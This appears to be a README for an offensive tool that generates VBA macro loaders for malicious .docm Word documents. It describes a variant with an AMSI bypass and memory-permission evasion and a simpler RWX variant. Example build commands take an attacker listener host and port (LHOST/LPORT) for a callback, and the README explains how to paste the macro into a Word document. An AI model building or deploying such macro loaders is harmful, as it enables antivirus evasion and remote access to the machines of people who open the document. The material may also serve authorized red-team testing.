# vba

VBA macro loader for `.docm` files. Two variants:

- `build_vba.py` — AMSI bypass + RW -> RX + split logic (recommended)
- `build_vba_basic.py` — minimal, RWX, single function

## Example

```bash
# Recommended (x64 + AMSI bypass)
python3 build_vba.py --arch x64 --lhost 192.168.x.x --lport 443

# Basic
python3 build_vba_basic.py --arch x64 --lhost 192.168.x.x --lport 443 -o loader.vba
```

Paste `loader.vba` into Word (Alt+F11 -> ThisDocument), save as `.docm`.
